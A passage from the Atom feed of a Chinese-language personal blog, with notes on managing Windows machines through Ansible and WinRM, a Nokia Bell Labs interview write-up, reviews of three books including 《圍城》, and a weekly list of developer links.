&lt;li&gt;開啟 WinRM: &lt;a href="https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1"&gt;https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;若網路有問題，改成私人網路(Private Network)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安裝 PowerShell  &lt;/li&gt;
&lt;li&gt;關閉 UAC  &lt;ul&gt;
&lt;li&gt;沒關的話，可能會造成部份 tasks 被中斷。(Optional，視情況而定，可能會遇到，也可能不會遇到）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼設定 Ansible？  &lt;/li&gt;
&lt;li&gt;Inventory 是什麼？  &lt;ul&gt;
&lt;li&gt;主要用來定義 Managed Node 的 IP 與 Group，也可以用來設定 WinRM 連線資訊。  &lt;/li&gt;
&lt;li&gt;在控管 Windows Managed node 前，還需要設定一些 inventory 變數。  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible_connection: winrm&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_port: 5968&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼用 Ad-Hoc command 管 Windows？  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible &amp;lt;主機名稱&amp;gt; -m &amp;lt;模組&amp;gt; -a &amp;lt;參數1&amp;gt; &amp;lt;參數2&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible all -m win_ping&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼用 Playbooks 和 Roles 管 Windows？  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;setup.yaml&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;===&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;hosts&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;all&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;roles&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;chusiang.win_vim&lt;/span&gt;  

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;tasks&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;copy check vim version file&lt;/span&gt;  
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;win_template&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
      &lt;span class="l l-Scalar l-Scalar-Plain"&gt;src&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;templates/check_vim_version.bat.2&amp;#39;&lt;/span&gt;  

&lt;span class="nn"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Demo&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://youtu.be/wZLT1B_uh9Q"&gt;https://youtu.be/wZLT1B_uh9Q&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;怎麼避開 Windows Playbooks 路徑地雷？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;使用 &lt;code&gt;key:value&lt;/code&gt; 寫法會比 &lt;code&gt;key=value&lt;/code&gt; 少採點雷  &lt;ul&gt;
&lt;li&gt;後者會不時遇到路徑無法辨識的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;避免在行尾使用 &lt;code&gt;\&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;遇到 &lt;code&gt;\&lt;/code&gt; 可以是用 &lt;code&gt;\\&lt;/code&gt; 來代替，因為 Windows 原先就會這樣解析路徑。  &lt;/li&gt;
&lt;li&gt;特殊符號解析有誤？  &lt;ul&gt;
&lt;li&gt;先寫好批次檔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 Playbooks 裡，&lt;code&gt;/&lt;/code&gt; 作為路徑的分隔符號是有效的。  &lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Ansible 常用的 Windows 有哪些？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;raw&lt;/code&gt;: Executes a low-down andy dirty SSH command.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_copy&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_file&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_get_url&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_lineinfile&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_msi&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_ping&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/chusiang/studyarea1607-ansible-demo"&gt;GitHub - chusiang/studyarea1607-ansible-demo: Ansible Playbook Roles Demo on StudyArea Summit 2016.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ansible.com/ansible-book"&gt;Ansible Up and Running eBook Preview | Ansible.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Q&amp;amp;A&lt;/h2&gt;
&lt;p&gt;Q: Playbooks 怎麼管理比較好？&lt;br /&gt;
A: 可以參考 &lt;a href="https://docs.ansible.com/ansible/playbooks_best_practices.html"&gt;Best Practices — Ansible Documentation&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Q: 是不是一定要透過 MSI? 有沒有遇過 AD server 上的問題？&lt;br /&gt;
A: AD server 的雷有遇到，然後因為我其實比較常用 Linux 和 Mac，所以大部份都是從 &lt;a href="https://docs.ansible.com/ansible/list_of_windows_modules.html"&gt;Windows Modules — Ansible Documentation&lt;/a&gt; 拿一些現成的來用。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Nokia Bell Labs 面試經驗 by 小飛機&lt;/h1&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;英文超級無敵重要  &lt;/li&gt;
&lt;li&gt;平時要多參與 Open Source 專案累積經驗  &lt;blockquote&gt;
&lt;p&gt;個人覺得還要注意的重點是深度，而且專案最好都要彼此有相關。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;面試一定要準備  &lt;/li&gt;
&lt;li&gt;做的專案要能夠適當的行銷  &lt;ul&gt;
&lt;li&gt;雖然當時的重點是放在怎麼 promote Taiwan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;正常歐洲處理速度超慢  &lt;ul&gt;
&lt;li&gt;從第一天寄信到面試過了一個月  &lt;/li&gt;
&lt;li&gt;歐洲還會放暑假  &lt;/li&gt;
&lt;li&gt;下班就下班了，沒在看 mail 的，所以約的時間常常很慢才看到就錯過。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;當然還需要點運氣  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="SDN"></category><category term="DevOps"></category><category term="DC/OS"></category><category term="ePUB"></category><category term="Git"></category><category term="Ansible"></category></entry><entry><title>《蟬堡：沒有夢的小鎮》</title><link href="https://blog.m157q.tw/posts/2016/07/14/%E8%9F%AC%E5%A0%A1-%E6%B2%92%E6%9C%89%E5%A4%A2%E7%9A%84%E5%B0%8F%E9%8E%AE/" rel="alternate"></link><published>2016-07-14T21:19:24+08:00</published><updated>2016-07-14T21:19:24+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-07-14:posts/2016/07/14/蟬堡-沒有夢的小鎮/</id><summary type="html">&lt;p&gt;&lt;img alt="封面" src="/files/蟬堡-沒有夢的小鎮/cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;和 &lt;a href="/posts/2016/07/11/fortress-besieged/"&gt;《圍城》&lt;/a&gt; 一樣，&lt;br /&gt;
是 2016/07/04 （日）晚上去逛信義誠品的時候買的，&lt;br /&gt;
已經好一陣子沒有看九把刀的書了，&lt;br /&gt;
大概就是國中時期看的最多，&lt;br /&gt;
高中的時候只有偶爾看一下新的《獵命師傳奇》吧，&lt;br /&gt;
但也沒有看到完結，&lt;br /&gt;
逛的時候剛好看到《蟬堡：沒有夢的小鎮》和《蟬堡：全世界我們最可憐》這兩本，&lt;br /&gt;
想說以前看到《蟬堡》都只有斷斷續續的篇章，&lt;br /&gt;
不如來看看完整的劇情吧？&lt;br /&gt;
再加上這次又想買一些和電腦技術比較無關的書籍來看，&lt;br /&gt;
就買了。  &lt;/p&gt;
&lt;p&gt;維持一貫的九把刀的亂七八糟的風格，&lt;br /&gt;
十八禁，當然，髒話、血腥、暴力、色情啥的，&lt;br /&gt;
就是都市恐怖病系列的風格。&lt;br /&gt;
回想起來我看的第一本九把刀的小說，&lt;br /&gt;
就是都市恐怖病系列的《功夫》啊，&lt;br /&gt;
現在想起來還是覺得很酷。&lt;br /&gt;
前面幾個章節是有印象的，&lt;br /&gt;
忘記是因為看過殺手系列的小說，&lt;br /&gt;
還是某個時候看過有人整理排序過的《蟬堡》了。&lt;br /&gt;
總之就是都市恐怖病系列的前傳，&lt;br /&gt;
在補完大魔王 Dr.Hydra 的誕生。&lt;br /&gt;
每一個章節都還蠻連貫的，&lt;br /&gt;
看完以後並沒有什麼太大的驚豔，&lt;br /&gt;
就只是補完很久以前看過的劇情吧。  &lt;/p&gt;
&lt;p&gt;看了後記才知道原來蟬堡是從 2004 年開始連載的啊，&lt;br /&gt;
沒講的話我都忘了是附在殺手系列小說裏面了，&lt;br /&gt;
畢竟從高中以後就不太看九把刀的小說了。&lt;br /&gt;
（說起來高中那時候是補完金庸和倪匡的衛斯理系列）&lt;br /&gt;
國中的時候看最多的應該是九把刀的愛情系列，&lt;br /&gt;
還是覺得他的愛情系列寫的最好，&lt;br /&gt;
某方面來說也算是青春的回憶吧。  &lt;/p&gt;</summary><category term="Novel"></category><category term="Giddens"></category><category term="九把刀"></category><category term="蟬堡"></category></entry><entry><title>《科學的極致：漫談人工智能》</title><link href="https://blog.m157q.tw/posts/2016/07/12/%E7%A7%91%E5%AD%B8%E7%9A%84%E6%A5%B5%E8%87%B4-%E6%BC%AB%E8%AB%87%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" rel="alternate"></link><published>2016-07-12T15:08:48+08:00</published><updated>2016-07-12T15:08:48+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-07-12:posts/2016/07/12/科學的極致-漫談人工智能/</id><summary type="html">&lt;p&gt;&lt;img alt="封面" src="/files/科學的極致-漫談人工智能/cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;又是一篇拖了很久的讀書紀錄，&lt;br /&gt;
這本書在今年的 5 月 22 日就讀完了，&lt;br /&gt;
可是因為我的拖延症，&lt;br /&gt;
一直到現在才寫這篇紀錄，&lt;br /&gt;
所以不意外的，&lt;br /&gt;
記憶可能會稍嫌模糊。  &lt;/p&gt;
&lt;p&gt;該還的文章債還是得還，&lt;br /&gt;
欠的不是別人，債主正是自己，&lt;br /&gt;
不寫點什麼紀錄一下的話，&lt;br /&gt;
我還真的會忘了自己做了這件事，&lt;br /&gt;
花點時間紀錄自己讀了書的感覺，&lt;br /&gt;
我覺得還是挺值得的。  &lt;/p&gt;
&lt;p&gt;這本書應該是今年農曆過年的時候，&lt;br /&gt;
跑去新竹清華大學對面的若水堂逛的時候買的其中一本，&lt;br /&gt;
我已經忘了自己為何那時候會跑去新竹了。&lt;br /&gt;
會買這本書是因為大學修人工智慧概論的狀況很差，&lt;br /&gt;
然後 Alpha Go 的 Deep Learning 又正夯，&lt;br /&gt;
覺得應該從頭把人工智慧好好瞭解一遍，&lt;br /&gt;
畢竟當初也不是沒興趣，&lt;br /&gt;
只是遇到了頗呵的教授然後自己又不長進。&lt;br /&gt;
看到這本書封面寫著科普，&lt;br /&gt;
就拿起來看了一下目錄和稍微翻閱了一下，&lt;br /&gt;
覺得範圍頗廣而且介紹也還算詳細，&lt;br /&gt;
而且沒記錯的話是 2015 年的書，&lt;br /&gt;
內容也還算新，就買了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;讀後感&lt;/h2&gt;
&lt;p&gt;讀了之後發現除了第一章以外，其他一點都不科普，不然就是我的知識水平太低。&lt;br /&gt;
我甚至有一頁是全部用螢光筆畫起來的，因為整頁我都看不懂。 Orz  &lt;/p&gt;
&lt;p&gt;這本書真的是從頭開始講起，一直講到現代的發展，而且介紹的範圍也還算廣。&lt;br /&gt;
但我現在的記憶程度大概只能把一些關鍵字列出來：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;圖靈機、Halting problem  &lt;/li&gt;
&lt;li&gt;符號學派、行為學派、聯結學派  &lt;/li&gt;
&lt;li&gt;SVM, 湧現, 電腦視覺，認數字  &lt;/li&gt;
&lt;li&gt;氣象預報、Captha  &lt;/li&gt;
&lt;li&gt;深度學習  &lt;/li&gt;
&lt;li&gt;人工智慧這三十年在理論方面基本上沒有太大的進展，大部份都還是用早期那些被提出來的理論做延伸的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每一章的主題都還蠻明確的，&lt;br /&gt;
基本上可以把每章當作個小論文來看待，&lt;br /&gt;
因為每章的最後都會附上 Reference，&lt;br /&gt;
不愁沒有延伸閱讀的材料。  &lt;/p&gt;
&lt;p&gt;我想有機會的話應該會再把這本書反覆讀個幾遍，&lt;br /&gt;
畢竟牽涉的範圍實在太廣，讀了一遍我也只能記了個大概，&lt;br /&gt;
有些太過理論與太過數學的地方我是跳過沒看的，&lt;br /&gt;
但我自己也知道，真的要看懂的話，這些被我跳過的地方才是關鍵啊。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.books.com.tw/products/CN11262408"&gt;博客來-科學的極致：漫談人工智能&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://ist.csu.edu.cn/ai/Ai/chapter1/13.htm"&gt;http://ist.csu.edu.cn/ai/Ai/chapter1/13.htm&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Computer Science"></category><category term="Artificial Intellegance"></category><category term="AI"></category><category term="Machine Learning"></category></entry><entry><title>《圍城》</title><link href="https://blog.m157q.tw/posts/2016/07/11/fortress-besieged/" rel="alternate"></link><published>2016-07-11T02:09:41+08:00</published><updated>2016-07-11T02:09:41+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-07-11:posts/2016/07/11/fortress-besieged/</id><summary type="html">&lt;p&gt;&lt;img alt="封面" src="/files/fortress-besieged/cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;上星期日回台北後一時興起，&lt;br /&gt;
就跑到信義誠品逛逛。&lt;br /&gt;
進到門口後就看到這本《圍城》，&lt;br /&gt;
高中教國文的班導常常稱讚錢鍾書的這部作品，&lt;br /&gt;
於是就信手拈來翻閱一下。  &lt;/p&gt;
&lt;p&gt;剛翻沒幾頁，&lt;br /&gt;
不知為何馬上想起曹雪芹的《紅樓夢》。&lt;br /&gt;
（《紅樓夢》我看了十幾回就看不下去了）&lt;br /&gt;
然後繼續快速翻閱愈覺相似，&lt;br /&gt;
也有種看不下去的感覺。&lt;br /&gt;
後來推友說很愛這本，&lt;br /&gt;
我才從頭慢慢細看，&lt;br /&gt;
突然別有一番風味，&lt;br /&gt;
就買回去慢慢看了。  &lt;/p&gt;
&lt;p&gt;事後覺得，&lt;br /&gt;
這種對於人物刻畫與情感描寫細膩的作品不適合快速翻閱，&lt;br /&gt;
只適合慢慢得、細細得品嚐，&lt;br /&gt;
也許只對我來說是如此吧，&lt;br /&gt;
又或許只是我看書速度慢，哈哈。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;讀後感&lt;/h2&gt;
&lt;p&gt;整本書大概有一半都是在坐船 XD&lt;br /&gt;
角色不算多，&lt;br /&gt;
對於人物的刻畫很鮮明，&lt;br /&gt;
所以我大致上都還記得有哪些角色。&lt;br /&gt;
（《紅樓夢》大概就是因為角色太多又不夠有特色，&lt;br /&gt;
搞得我都記不清，每次都要翻到前面去查，我才看不下去的吧？）  &lt;/p&gt;
&lt;p&gt;這本書一出版後似乎就因為政治因素無法在臺灣和中國流通，&lt;br /&gt;
其實不是很懂真正的原因，&lt;br /&gt;
也許是我不夠瞭解當時的時代背景吧？&lt;br /&gt;
查了一下發現中國那邊有把這個作品歸類到諷刺小說的，&lt;br /&gt;
甚至還給了《新儒林外史》這個稱號，&lt;br /&gt;
說是在諷刺那個年代留洋回來從政的官大抵上都是書裡頭所描述的樣子，&lt;br /&gt;
不是造假學歷，不然就是為了職位勾心鬥角等等，&lt;br /&gt;
仔細想想如果是這樣被禁的話，好像也有幾分道理。  &lt;/p&gt;
&lt;p&gt;整本書是圍繞著主人翁方鴻漸在描述的，&lt;br /&gt;
每一章的開頭都與上一章沒什麼連貫，&lt;br /&gt;
以方鴻漸的愛情為主軸，&lt;br /&gt;
鮑小姐、蘇文紈、唐曉芙、孫柔嘉，&lt;br /&gt;
每一位女性都各有特色。&lt;br /&gt;
再輔以趙辛楣這位男配角，&lt;br /&gt;
蘇、趙、方之間的三角關係，&lt;br /&gt;
以及後來方趙兩人成為知己，&lt;br /&gt;
前往三閭大學任教的種種經過。&lt;br /&gt;
描述了當時的中西文化衝突，&lt;br /&gt;
自由戀愛與媒妁之言，&lt;br /&gt;
傳統父權與女權崛起，&lt;br /&gt;
再加上二次世界大戰日本侵中的戰爭背景，&lt;br /&gt;
還有那個時代的知識份子的一些作為。&lt;br /&gt;
明著是講婚姻是座圍城，&lt;br /&gt;
但實際上比喻了人生的每個階段都像是個圍城，&lt;br /&gt;
逃了一個，又進去另外一個，&lt;br /&gt;
無論是唸書、愛情、工作、婚姻全都是一樣，&lt;br /&gt;
看看方鴻漸就知道。  &lt;/p&gt;
&lt;p&gt;書的最後，&lt;br /&gt;
楊絳女士（錢鍾書的夫人）所撰寫的附錄，&lt;br /&gt;
個人覺得為整本書加上了畫龍點睛的效果，&lt;br /&gt;
令人在看完整本書的回味之餘，&lt;br /&gt;
又更加瞭解了這本書創作的背景。&lt;br /&gt;
像書中人物講的玩笑話許多我都覺得頗好笑的，&lt;br /&gt;
看了附錄才知道很多都是他們夫妻之間的玩笑話和錢鍾書的個性所造就。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;記錄一下書中蘇文紈提到關於圍城的最經典的那段：&lt;br /&gt;
（括號的部份是我自己加的，怕之後看這篇文章的時候我已經忘記了。）  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（褚）慎明道：「關於 Bertie （羅素）結婚離婚的事，我也和他談過。&lt;br /&gt;
他引一句英國古話，說結婚彷彿金漆的鳥籠，籠子外面的鳥想住進去，籠內的鳥想飛出來；&lt;br /&gt;
所以結而離，離而結，沒有了局。」  &lt;/p&gt;
&lt;p&gt;蘇小姐（蘇文紈）道：「法國也有這麼一句話。不過，不說是鳥籠，說是被圍困的城堡 forteresse assiégée，&lt;br /&gt;
城外的人想衝進去，城裡的人想逃出來。鴻漸，是不是？」鴻漸搖頭表示不知道。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%9B%B4%E5%9F%8E_(%E5%B0%8F%E8%AF%B4)"&gt;围城 (小说) - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Fortress_Besieged"&gt;Fortress Besieged - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%92%B1%E9%94%BA%E4%B9%A6"&gt;錢鍾書 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%9D%A8%E7%BB%9B"&gt;杨绛 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Chinese"></category><category term="Novel"></category></entry><entry><title>Y2016W27</title><link href="https://blog.m157q.tw/posts/2016/07/11/y2016w27/" rel="alternate"></link><published>2016-07-11T00:31:58+08:00</published><updated>2016-07-11T00:31:58+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-07-11:posts/2016/07/11/y2016w27/</id><summary type="html">&lt;h3&gt;Android&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/antojoseph/diff-gui"&gt;GitHub - antojoseph/diff-gui&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;似乎是拿來做動態分析的工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/6273608/how-to-pass-argument-to-makefile-from-command-line"&gt;parameters - How to pass argument to Makefile from command line? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$(filter-out $@,$(MAKECMDGOALS))&lt;/code&gt; 這招蠻妙的，還得搭配底下的 &lt;code&gt;%:&lt;/code&gt;, &lt;code&gt;@:&lt;/code&gt; 使用，才不會把參數當成 target 來 make.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Compiler&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://slide.logan.tw/compiler-intro/#/"&gt;Introduction to Compiler Development&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;介紹的還蠻詳細的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/openstack/bandit"&gt;GitHub - openstack/bandit: Python AST-based static analyzer from OpenStack Security Group&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哦哦哦，看來以後測試除了跑 flake8 以外，可能也得跑一下這個檢查安全性了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jonathanslenders/python-prompt-toolkit"&gt;GitHub - jonathanslenders/python-prompt-toolkit: Library for building powerful interactive command lines in Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;CLI command 自動補完的套件，蠻多有名的專案都有用到的。像最近 IPython 釋出的 5.0.0 就有用到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/ericclemmons/b146fe5da72ca1f706b2ef72a20ac39d"&gt;HTML5 &lt;code&gt;&amp;lt;details&amp;gt;&lt;/code&gt; in GitHub · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;在 GitHub 開 Issue 要附上很長的 log，可用 &lt;code&gt;&amp;lt;details&amp;gt;&lt;/code&gt; 這個 HTML5 的 tag 包起來，讓 Log 顯示變成 Toggle 的。  &lt;/li&gt;
&lt;li&gt;效果就像這樣：&lt;details&gt;你看到了詳細內容，假的！&lt;/details&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;K8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ianlewis.org/en/using-kubernetes-health-checks"&gt;Using Kubernetes Health Checks - Ian Lewis&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;感覺似乎是工作上需要用到的一個東西，在 rolling update 的時候，針對特定的服務做 check，確定有執行後才開始把舊的 container 關掉。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/notes/ruinland-maskman/%E5%88%9D%E6%8E%A2ubuntu-snap-on-arch-linux/967272033371255"&gt;初探 Ubuntu snap on Arch Linux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Mapreduce&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatform/appengine-mapreduce/blob/master/python/src/mapreduce/input_readers.py"&gt;appengine-mapreduce/input_readers.py at master · GoogleCloudPlatform/appengine-mapreduce · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;LogInputReader&lt;/code&gt; 可以拿來讀取 App Engine 的 log，拿來分析。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wisestamp.com/blog/mapreduce-on-app-engine-made-easy/"&gt;MapReduce on App Engine made easy&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatform/appengine-pipelines/blob/master/python/src/pipeline/pipeline.py#L393"&gt;appengine-pipelines/pipeline.py at master · GoogleCloudPlatform/appengine-pipelines · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatform/appengine-mapreduce/wiki"&gt;Home · GoogleCloudPlatform/appengine-mapreduce Wiki · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://sookocheff.com/series/mapreduce-api/"&gt;Mapreduce Api : sookocheff.com&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;非常詳細的系列文，一共有七篇，覺得寫的很不錯。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=EIxelKcyCC0"&gt;Google I/O 2011: App Engine MapReduce - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatform/appengine-mapreduce/blob/master/python/src/mapreduce/output_writers.py"&gt;appengine-mapreduce/output_writers.py at master · GoogleCloudPlatform/appengine-mapreduce · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.therooststand.com/"&gt;Roost Laptop Stand: Portable, Lightweight, Adjustable, Ergonomic Stand&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;感覺蠻方便的螢幕架  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=LA1jrE3HZuc"&gt;【翻譯】你們在說啥？沒追《冰與火之歌》之一般人的日常 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用腳踏車鈴在那邊 Shame Shame Shame XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hrd.college.itri.org.tw/coedu/GoodJob10.aspx"&gt;產學合作人才培育資訊網&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個 UI/UX 的要求有大公司的水準！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Npm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nplaym"&gt;nplaym&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;裝 npm 的時候太無聊的話可以玩遊戲 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Pypy&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://morepypy.blogspot.tw/2016/07/reverse-debugging-for-python.html"&gt;PyPy Status Blog: Reverse debugging for Python&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/8822335/what-do-the-python-file-extensions-pyc-pyd-pyo-stand-for"&gt;What do the python file extensions, .pyc .pyd .pyo stand for? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
